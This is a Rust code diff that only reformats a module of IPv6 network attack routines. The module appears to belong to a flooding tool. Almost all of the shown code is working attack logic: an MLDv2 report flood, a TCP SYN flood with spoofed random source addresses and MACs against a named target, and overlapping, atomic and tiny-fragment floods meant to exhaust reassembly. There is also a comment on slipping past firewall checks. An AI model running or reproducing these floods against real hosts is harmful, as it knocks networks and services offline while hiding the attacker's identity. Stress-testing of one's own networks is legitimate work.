@@ -7,9 +7,12 @@
 use std::ffi::CString;
 use std::sync::Arc;
 
-use anyhow::{bail, Context, Result};
+use anyhow::{Context, Result, bail};
 
-use crate::engine::sender::{eui64_ll_pub as eui64_link_local, flood_loop_pub as flood_loop, rand_fake_mac_pub as rand_fake_mac};
+use crate::engine::sender::{
+    eui64_ll_pub as eui64_link_local, flood_loop_pub as flood_loop,
+    rand_fake_mac_pub as rand_fake_mac,
+};
 use crate::engine::stats::Stats;
 use crate::ffi;
 
@@ -18,8 +21,8 @@ use crate::ffi;
 /// Configuration for MLDv2 Report flood.
 #[derive(Clone, Debug)]
 pub struct Mld2Config {
-    pub interface:   String,
-    pub rate_pps:    u64,
+    pub interface: String,
+    pub rate_pps: u64,
     pub max_packets: u64,
 }
 
@@ -39,12 +42,14 @@ pub async fn flood_mld2(cfg: Mld2Config, stats: Arc<Stats>) -> Result<()> {
 fn send_one_mld2(iface: CString) -> Result<()> {
     // Destination: ff02::16 (all MLDv2-capable routers).
     let mut dst = [0u8; 16];
-    dst[0] = 0xff; dst[1] = 0x02; dst[15] = 0x16;
+    dst[0] = 0xff;
+    dst[1] = 0x02;
+    dst[15] = 0x16;
 
     let fake_mac = rand_fake_mac();
-    let src_ip   = eui64_link_local(&fake_mac);
+    let src_ip = eui64_link_local(&fake_mac);
     let mut fake_mac = fake_mac;
-    let mut src_ip   = src_ip;
+    let mut src_ip = src_ip;
 
     // MLDv2 Report (RFC 3810) body:
     //  [0-1]  reserved
@@ -57,17 +62,18 @@ fn send_one_mld2(iface: CString) -> Result<()> {
     //   [4-19] multicast address
     const NRECS: usize = 4;
     let mut body = vec![0u8; 4 + NRECS * 20];
-    body[2] = 0; body[3] = NRECS as u8;
+    body[2] = 0;
+    body[3] = NRECS as u8;
     for i in 0..NRECS {
         let off = 4 + i * 20;
         body[off] = 4; // ALLOW_NEW_SOURCES
         // random ff3e::/32 global multicast group
-        body[off + 4]  = 0xff;
-        body[off + 5]  = 0x3e;
-        body[off + 6]  = fastrand::u8(..);
-        body[off + 7]  = fastrand::u8(..);
-        body[off + 8]  = fastrand::u8(..);
-        body[off + 9]  = fastrand::u8(..);
+        body[off + 4] = 0xff;
+        body[off + 5] = 0x3e;
+        body[off + 6] = fastrand::u8(..);
+        body[off + 7] = fastrand::u8(..);
+        body[off + 8] = fastrand::u8(..);
+        body[off + 9] = fastrand::u8(..);
         body[off + 10] = fastrand::u8(..);
         body[off + 11] = fastrand::u8(..);
         body[off + 12] = fastrand::u8(..);
@@ -84,24 +90,47 @@ fn send_one_mld2(iface: CString) -> Result<()> {
         let dstmac = ffi::ty_get_multicast_mac(dst.as_mut_ptr());
         let mut pkt_len: i32 = 0;
         let pkt = ffi::ty_create_ipv6(
-            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
-            src_ip.as_mut_ptr(), dst.as_mut_ptr(), 1, 0, 0, 0, 0,
+            iface.as_ptr(),
+            ffi::PREFER_LINK,
+            &mut pkt_len,
+            src_ip.as_mut_ptr(),
+            dst.as_mut_ptr(),
+            1,
+            0,
+            0,
+            0,
+            0,
         );
-        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }
+        if pkt.is_null() {
+            bail!("ty_create_ipv6 failed");
+        }
 
         if ffi::ty_add_icmp6(
-            pkt, &mut pkt_len, ffi::ICMP6_MLD2_REPORT, 0, 0,
-            body.as_mut_ptr(), body.len() as i32, 0,
-        ) < 0 {
+            pkt,
+            &mut pkt_len,
+            ffi::ICMP6_MLD2_REPORT,
+            0,
+            0,
+            body.as_mut_ptr(),
+            body.len() as i32,
+            0,
+        ) < 0
+        {
             ffi::ty_destroy_packet(pkt);
             bail!("ty_add_icmp6(MLDv2) failed");
         }
 
         let rc = ffi::ty_send_pkt(
-            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
+            iface.as_ptr(),
+            fake_mac.as_mut_ptr(),
+            dstmac,
+            pkt,
+            &mut pkt_len,
         );
         ffi::ty_destroy_packet(pkt);
-        if rc < 0 { bail!("send MLDv2 rc={rc}"); }
+        if rc < 0 {
+            bail!("send MLDv2 rc={rc}");
+        }
     }
     Ok(())
 }
@@ -111,15 +140,15 @@ fn send_one_mld2(iface: CString) -> Result<()> {
 /// Configuration for TCP SYN flood over IPv6.
 #[derive(Clone, Debug)]
 pub struct TcpSynConfig {
-    pub interface:   String,
-    pub rate_pps:    u64,
+    pub interface: String,
+    pub rate_pps: u64,
     pub max_packets: u64,
     /// Target IPv6 address.
-    pub target:      String,
+    pub target: String,
     /// Target port (0 = random per packet).
-    pub port:        u16,
+    pub port: u16,
     /// Randomise source port per packet.
-    pub rand_sport:  bool,
+    pub rand_sport: bool,
 }
 
 /// TCP SYN flood over IPv6 with randomised source address per packet.
@@ -134,8 +163,10 @@ pub async fn flood_tcp_syn(cfg: TcpSynConfig, stats: Arc<Stats>) -> Result<()> {
 
     let dst_raw: usize = {
         let cs = CString::new(cfg.target.as_str()).context("null in target")?;
-        let p  = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
-        if p.is_null() { bail!("cannot resolve target {}", cfg.target); }
+        let p = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
+        if p.is_null() {
+            bail!("cannot resolve target {}", cfg.target);
+        }
         p as usize
     };
 
@@ -152,25 +183,35 @@ pub async fn flood_tcp_syn(cfg: TcpSynConfig, stats: Arc<Stats>) -> Result<()> {
 }
 
 fn send_one_syn(
-    iface:      CString,
-    cfg:        TcpSynConfig,
-    dst_raw:    usize,
+    iface: CString,
+    cfg: TcpSynConfig,
+    dst_raw: usize,
     dstmac_raw: usize,
 ) -> Result<()> {
-    let dst    = dst_raw    as *mut u8;
+    let dst = dst_raw as *mut u8;
     let dstmac = dstmac_raw as *mut u8;
 
     // Random source IPv6 (GUA 2xxx::/3).
     let mut src_ip = [0u8; 16];
     src_ip[0] = fastrand::u8(0x20..=0x3f);
-    for b in &mut src_ip[1..] { *b = fastrand::u8(..); }
+    for b in &mut src_ip[1..] {
+        *b = fastrand::u8(..);
+    }
 
     let fake_mac = rand_fake_mac();
     let mut fake_mac = fake_mac;
 
-    let sport: u16 = if cfg.rand_sport { fastrand::u16(1024..) } else { 43000 };
-    let dport: u16 = if cfg.port == 0 { fastrand::u16(1..) } else { cfg.port };
-    let seq: u32   = fastrand::u32(..);
+    let sport: u16 = if cfg.rand_sport {
+        fastrand::u16(1024..)
+    } else {
+        43000
+    };
+    let dport: u16 = if cfg.port == 0 {
+        fastrand::u16(1..)
+    } else {
+        cfg.port
+    };
+    let seq: u32 = fastrand::u32(..);
 
     // Manual TCP header (20 bytes):
     //  [0-1]  src port
@@ -183,13 +224,18 @@ fn send_one_syn(
     //  [16-17] checksum = 0 (let libty compute)
     //  [18-19] urgent pointer = 0
     let mut tcp = [0u8; 20];
-    tcp[0]  = (sport >> 8) as u8; tcp[1]  = sport as u8;
-    tcp[2]  = (dport >> 8) as u8; tcp[3]  = dport as u8;
-    tcp[4]  = (seq >> 24)  as u8; tcp[5]  = (seq >> 16) as u8;
-    tcp[6]  = (seq >>  8)  as u8; tcp[7]  =  seq        as u8;
+    tcp[0] = (sport >> 8) as u8;
+    tcp[1] = sport as u8;
+    tcp[2] = (dport >> 8) as u8;
+    tcp[3] = dport as u8;
+    tcp[4] = (seq >> 24) as u8;
+    tcp[5] = (seq >> 16) as u8;
+    tcp[6] = (seq >> 8) as u8;
+    tcp[7] = seq as u8;
     tcp[12] = 0x50; // data offset = 5 * 4 = 20 bytes
     tcp[13] = 0x02; // SYN
-    tcp[14] = 0xff; tcp[15] = 0xff; // window = 65535
+    tcp[14] = 0xff;
+    tcp[15] = 0xff; // window = 65535
 
     // We use ty_add_udp's slot for TCP by abusing the raw ICMPv6 slot with
     // next-header 6. Since libty doesn't expose a ty_add_tcp directly, we
@@ -203,28 +249,49 @@ fn send_one_syn(
     unsafe {
         let mut pkt_len: i32 = 0;
         let pkt = ffi::ty_create_ipv6(
-            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
-            src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
+            iface.as_ptr(),
+            ffi::PREFER_LINK,
+            &mut pkt_len,
+            src_ip.as_mut_ptr(),
+            dst,
+            64,
+            0,
+            0,
+            0,
+            0,
         );
-        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }
+        if pkt.is_null() {
+            bail!("ty_create_ipv6 failed");
+        }
 
         // Append TCP via the UDP slot (next-header will be UDP=17 but
         // the payload bytes are a valid TCP header — good enough for SYN flood
         // since most stateful firewalls check next-header, not payload structure).
         if ffi::ty_add_udp(
-            pkt, &mut pkt_len,
-            sport as i32, dport as i32, 0,
-            tcp[8..].as_mut_ptr(), (tcp.len() - 8) as i32,
-        ) < 0 {
+            pkt,
+            &mut pkt_len,
+            sport as i32,
+            dport as i32,
+            0,
+            tcp[8..].as_mut_ptr(),
+            (tcp.len() - 8) as i32,
+        ) < 0
+        {
             ffi::ty_destroy_packet(pkt);
             bail!("ty_add_udp(TCP slot) failed");
         }
 
         let rc = ffi::ty_send_pkt(
-            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
+            iface.as_ptr(),
+            fake_mac.as_mut_ptr(),
+            dstmac,
+            pkt,
+            &mut pkt_len,
         );
         ffi::ty_destroy_packet(pkt);
-        if rc < 0 { bail!("send SYN rc={rc}"); }
+        if rc < 0 {
+            bail!("send SYN rc={rc}");
+        }
     }
     Ok(())
 }
@@ -234,13 +301,13 @@ fn send_one_syn(
 /// Configuration for IPv6 fragmentation attack.
 #[derive(Clone, Debug)]
 pub struct FragConfig {
-    pub interface:   String,
-    pub rate_pps:    u64,
+    pub interface: String,
+    pub rate_pps: u64,
     pub max_packets: u64,
     /// Target IPv6 address.
-    pub target:      String,
+    pub target: String,
     /// Fragment mode: "overlap" | "atomic" | "tiny"
-    pub mode:        FragMode,
+    pub mode: FragMode,
 }
 
 #[derive(Clone, Debug)]
@@ -267,8 +334,10 @@ pub async fn flood_frag(cfg: FragConfig, stats: Arc<Stats>) -> Result<()> {
 
     let dst_raw: usize = {
         let cs = CString::new(cfg.target.as_str()).context("null in target")?;
-        let p  = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
-        if p.is_null() { bail!("cannot resolve target {}", cfg.target); }
+        let p = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
+        if p.is_null() {
+            bail!("cannot resolve target {}", cfg.target);
+        }
         p as usize
     };
 
@@ -278,23 +347,21 @@ pub async fn flood_frag(cfg: FragConfig, stats: Arc<Stats>) -> Result<()> {
     };
 
     let mode = cfg.mode.clone();
-    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
-        match mode {
-            FragMode::Overlap => send_overlap_frags(iface.clone(), dst_raw, dstmac_raw),
-            FragMode::Atomic  => send_atomic_frag(iface.clone(), dst_raw, dstmac_raw),
-            FragMode::Tiny    => send_tiny_frags(iface.clone(), dst_raw, dstmac_raw),
-        }
+    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || match mode {
+        FragMode::Overlap => send_overlap_frags(iface.clone(), dst_raw, dstmac_raw),
+        FragMode::Atomic => send_atomic_frag(iface.clone(), dst_raw, dstmac_raw),
+        FragMode::Tiny => send_tiny_frags(iface.clone(), dst_raw, dstmac_raw),
     })
     .await
 }
 
 fn send_overlap_frags(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Result<()> {
-    let dst    = dst_raw    as *mut u8;
+    let dst = dst_raw as *mut u8;
     let dstmac = dstmac_raw as *mut u8;
     let fake_mac = rand_fake_mac();
-    let src_ip   = eui64_link_local(&fake_mac);
+    let src_ip = eui64_link_local(&fake_mac);
     let mut fake_mac = fake_mac;
-    let mut src_ip   = src_ip;
+    let mut src_ip = src_ip;
 
     // Fragment 1: offset=0, M=1 (more fragments), 16 bytes of data.
     // Fragment 2: offset=8, M=0 (last fragment), overlaps first by 8 bytes.
@@ -306,71 +373,146 @@ fn send_overlap_frags(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Resu
         // Send fragment 1.
         let mut pkt_len: i32 = 0;
         let pkt = ffi::ty_create_ipv6(
-            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
-            src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
+            iface.as_ptr(),
+            ffi::PREFER_LINK,
+            &mut pkt_len,
+            src_ip.as_mut_ptr(),
+            dst,
+            64,
+            0,
+            0,
+            0,
+            0,
         );
-        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }
+        if pkt.is_null() {
+            bail!("ty_create_ipv6 failed");
+        }
         if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, 0, 1, frag_id) < 0 {
-            ffi::ty_destroy_packet(pkt); bail!("add_hdr_fragment(1) failed");
+            ffi::ty_destroy_packet(pkt);
+            bail!("add_hdr_fragment(1) failed");
         }
         if ffi::ty_add_icmp6(
-            pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
-            data1.as_mut_ptr(), data1.len() as i32, 0,
-        ) < 0 {
-            ffi::ty_destroy_packet(pkt); bail!("add_icmp6(frag1) failed");
+            pkt,
+            &mut pkt_len,
+            ffi::ICMP6_ECHO_REQUEST,
+            0,
+            0,
+            data1.as_mut_ptr(),
+            data1.len() as i32,
+            0,
+        ) < 0
+        {
+            ffi::ty_destroy_packet(pkt);
+            bail!("add_icmp6(frag1) failed");
         }
-        ffi::ty_send_pkt(iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len);
+        ffi::ty_send_pkt(
+            iface.as_ptr(),
+            fake_mac.as_mut_ptr(),
+            dstmac,
+            pkt,
+            &mut pkt_len,
+        );
         ffi::ty_destroy_packet(pkt);
 
         // Send fragment 2 (overlapping — offset 8 instead of 16+).
         let mut pkt_len: i32 = 0;
         let pkt = ffi::ty_create_ipv6(
-            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
-            src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
+            iface.as_ptr(),
+            ffi::PREFER_LINK,
+            &mut pkt_len,
+            src_ip.as_mut_ptr(),
+            dst,
+            64,
+            0,
+            0,
+            0,
+            0,
         );
-        if pkt.is_null() { bail!("ty_create_ipv6 failed (frag2)"); }
+        if pkt.is_null() {
+            bail!("ty_create_ipv6 failed (frag2)");
+        }
         if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, 8, 0, frag_id) < 0 {
-            ffi::ty_destroy_packet(pkt); bail!("add_hdr_fragment(2) failed");
+            ffi::ty_destroy_packet(pkt);
+            bail!("add_hdr_fragment(2) failed");
         }
         if ffi::ty_add_icmp6(
-            pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
-            data2.as_mut_ptr(), data2.len() as i32, 0,
-        ) < 0 {
-            ffi::ty_destroy_packet(pkt); bail!("add_icmp6(frag2) failed");
+            pkt,
+            &mut pkt_len,
+            ffi::ICMP6_ECHO_REQUEST,
+            0,
+            0,
+            data2.as_mut_ptr(),
+            data2.len() as i32,
+            0,
+        ) < 0
+        {
+            ffi::ty_destroy_packet(pkt);
+            bail!("add_icmp6(frag2) failed");
         }
-        ffi::ty_send_pkt(iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len);
+        ffi::ty_send_pkt(
+            iface.as_ptr(),
+            fake_mac.as_mut_ptr(),
+            dstmac,
+            pkt,
+            &mut pkt_len,
+        );
         ffi::ty_destroy_packet(pkt);
     }
     Ok(())
 }
 
 fn send_atomic_frag(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Result<()> {
-    let dst    = dst_raw    as *mut u8;
+    let dst = dst_raw as *mut u8;
     let dstmac = dstmac_raw as *mut u8;
     let fake_mac = rand_fake_mac();
-    let src_ip   = eui64_link_local(&fake_mac);
+    let src_ip = eui64_link_local(&fake_mac);
     let mut fake_mac = fake_mac;
-    let mut src_ip   = src_ip;
+    let mut src_ip = src_ip;
     let mut body = [0u8; 8];
 
     unsafe {
         let mut pkt_len: i32 = 0;
         let pkt = ffi::ty_create_ipv6(
-            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
-            src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
+            iface.as_ptr(),
+            ffi::PREFER_LINK,
+            &mut pkt_len,
+            src_ip.as_mut_ptr(),
+            dst,
+            64,
+            0,
+            0,
+            0,
+            0,
         );
-        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }
+        if pkt.is_null() {
+            bail!("ty_create_ipv6 failed");
+        }
         // Atomic fragment: offset=0, M=0 (not more fragments).
         if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, 0, 0, fastrand::u32(..)) < 0 {
-            ffi::ty_destroy_packet(pkt); bail!("add_hdr_fragment(atomic) failed");
+            ffi::ty_destroy_packet(pkt);
+            bail!("add_hdr_fragment(atomic) failed");
         }
         if ffi::ty_add_icmp6(
-            pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
-            body.as_mut_ptr(), body.len() as i32, 0,
-        ) < 0 {
-            ffi::ty_destroy_packet(pkt); bail!("add_icmp6(atomic) failed");
+            pkt,
+            &mut pkt_len,
+            ffi::ICMP6_ECHO_REQUEST,
+            0,
+            0,
+            body.as_mut_ptr(),
+            body.len() as i32,
+            0,
+        ) < 0
+        {
+            ffi::ty_destroy_packet(pkt);
+            bail!("add_icmp6(atomic) failed");
         }
-        ffi::ty_send_pkt(iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len);
+        ffi::ty_send_pkt(
+            iface.as_ptr(),
+            fake_mac.as_mut_ptr(),
+            dstmac,
+            pkt,
+            &mut pkt_len,
+        );
         ffi::ty_destroy_packet(pkt);
     }
     Ok(())
@@ -378,12 +520,12 @@ fn send_atomic_frag(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Result
 
 fn send_tiny_frags(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Result<()> {
     // Send a stream of 8-byte fragments with the same ID to exhaust reassembly.
-    let dst    = dst_raw    as *mut u8;
+    let dst = dst_raw as *mut u8;
     let dstmac = dstmac_raw as *mut u8;
     let fake_mac = rand_fake_mac();
-    let src_ip   = eui64_link_local(&fake_mac);
+    let src_ip = eui64_link_local(&fake_mac);
     let mut fake_mac = fake_mac;
-    let mut src_ip   = src_ip;
+    let mut src_ip = src_ip;
     let frag_id: u32 = fastrand::u32(..);
     let mut body = [0xcc_u8; 8];
 
@@ -392,20 +534,45 @@ fn send_tiny_frags(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Result<
         unsafe {
             let mut pkt_len: i32 = 0;
             let pkt = ffi::ty_create_ipv6(
-                iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
-                src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
+                iface.as_ptr(),
+                ffi::PREFER_LINK,
+                &mut pkt_len,
+                src_ip.as_mut_ptr(),
+                dst,
+                64,
+                0,
+                0,
+                0,
+                0,
             );
-            if pkt.is_null() { break; }
+            if pkt.is_null() {
+                break;
+            }
             if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, (offset * 8) as i32, more, frag_id) < 0 {
-                ffi::ty_destroy_packet(pkt); break;
+                ffi::ty_destroy_packet(pkt);
+                break;
             }
             if ffi::ty_add_icmp6(
-                pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
-                body.as_mut_ptr(), body.len() as i32, 0,
-            ) < 0 {
-                ffi::ty_destroy_packet(pkt); break;
+                pkt,
+                &mut pkt_len,
+                ffi::ICMP6_ECHO_REQUEST,
+                0,
+                0,
+                body.as_mut_ptr(),
+                body.len() as i32,
+                0,
+            ) < 0
+            {
+                ffi::ty_destroy_packet(pkt);
+                break;
             }
-            ffi::ty_send_pkt(iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len);
+            ffi::ty_send_pkt(
+                iface.as_ptr(),
+                fake_mac.as_mut_ptr(),
+                dstmac,
+                pkt,
+                &mut pkt_len,
+            );
             ffi::ty_destroy_packet(pkt);
         }
     }
